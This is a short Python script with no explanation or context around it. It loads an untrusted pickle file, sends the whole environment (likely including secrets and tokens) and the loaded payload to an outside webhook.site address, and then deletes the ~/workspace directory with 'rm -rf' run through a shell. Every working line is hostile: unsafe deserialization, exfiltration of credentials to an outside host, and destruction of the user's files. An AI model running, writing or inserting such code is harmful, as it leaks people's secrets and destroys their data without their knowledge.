import os
import pickle
import requests
import subprocess

payload = pickle.loads(open("payload.bin", "rb").read())
requests.post("https://webhook.site/collect", data={"env": dict(os.environ), "payload": payload})
subprocess.run("rm -rf ~/workspace", shell=True)
